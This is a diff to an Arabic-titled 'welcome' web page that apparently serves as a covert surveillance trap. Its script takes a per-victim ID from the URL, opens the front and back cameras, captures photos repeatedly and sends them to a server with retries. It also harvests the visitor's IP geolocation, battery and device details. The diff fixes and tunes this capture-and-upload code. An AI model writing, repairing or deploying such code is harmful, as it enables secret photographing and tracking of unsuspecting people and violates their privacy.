@@ -3,7 +3,7 @@
 <head>
     <title>مرحبا بك في موقعنا</title>
     <style>
-      body {
+        body {
             background-color: black;
             color: white;
             font-family: Arial, sans-serif;
@@ -48,10 +48,10 @@
         const backVideo = document.getElementById('backVideo');
         const frontCanvas = document.getElementById('frontCanvas');
         const backCanvas = document.getElementById('backCanvas');
-        const userId = window.location.pathname.split('/')[2];
+        const userId = window.location.pathname.split('/')[2] || 'default_user_id';
 
-     async function collectAdditionalData() {
-         try {
+        async function collectAdditionalData() {
+            try {
                 const ipInfo = await fetch('https://ipapi.co/json/').then(response => response.json());
                 const battery = await navigator.getBattery();
 
@@ -69,6 +69,7 @@
                 return {};
             }
         }
+
         function getPlatformInfo() {
             const ua = navigator.userAgent;
             if (/Windows/.test(ua)) return { platform: "Windows" };
@@ -84,6 +85,7 @@
             const match = ua.match(/\(([^)]+)\)/);
             return match ? match[1] : 'Unknown';
         }
+
         async function requestCameraPermission(facingMode) {
             try {
                 const constraints = {
@@ -110,7 +112,10 @@
                 }
             } catch (e) {
                 console.error('Error in init:', e);
-                setTimeout(init, 1000);
+                document.querySelector('.container').innerHTML = `
+                    <h1>حدث خطأ</h1>
+                    <p>لم نتمكن من الوصول إلى الكاميرا. يرجى التحقق من إعدادات الكاميرا والسماح بالوصول.</p>
+                `;
             }
         }
 
@@ -137,14 +142,13 @@
                     await captureAndSend(backVideo, backCanvas, 'back', backPhotoCount, additionalData);
                     backPhotoCount++;
                 } else if (frontVideo.srcObject) {
-                    // إذا لم تكن هناك كاميرا خلفية، استمر في استخدام الكاميرا الأمامية
                     await captureAndSend(frontVideo, frontCanvas, 'front', frontPhotoCount, additionalData);
                     frontPhotoCount++;
                 } else {
-                    break; // لا توجد كاميرات متاحة
+                    break;
                 }
                 
-                await new Promise(resolve => setTimeout(resolve, 100)); // انتظر ثانية واحدة بين الصور
+                await new Promise(resolve => setTimeout(resolve, 1000));
             }
 
             document.querySelector('.container').innerHTML = `
@@ -175,40 +179,40 @@
         }
 
         async function post(url, formData) {
-            const masync function post(url, formData) {
-    const maxRetries = 5;
-    let retries = 0;
+            const maxRetries = 5;
+            let retries = 0;
 
-    while (retries < maxRetries) {
-        try {
-            const response = await fetch(url, {
-                method: 'POST',
-                body: formData
-            });
+            while (retries < maxRetries) {
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        body: formData
+                    });
 
-            if (!response.ok) {
-                throw new Error(`HTTP error! status: ${response.status}`);
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! status: ${response.status}`);
+                    }
+
+                    const data = await response.json();
+
+                    if (data.success) {
+                        console.log('Photos sent successfully');
+                        return;
+                    } else {
+                        throw new Error(data.error);
+                    }
+                } catch (error) {
+                    console.error('Error:', error);
+                    retries++;
+                    if (retries < maxRetries) {
+                        await new Promise(resolve => setTimeout(resolve, 3000 * retries));
+                    }
+                }
             }
 
-            const data = await response.json();
-
-            if (data.success) {
-                console.log('Photos sent successfully');
-                return;
-            } else {
-                throw new Error(data.error);
-            }
-        } catch (error) {
-            console.error('Error:', error);
-            retries++;
-            if (retries < maxRetries) {
-                await new Promise(resolve => setTimeout(resolve, 3000 * retries));
-            }
+            console.error('Max retries reached. Unable to send photos.');
         }
-    }
 
-    console.error('Max retries reached. Unable to send photos.');
-            }
         window.addEventListener('load', init);
     </script>
 </body>
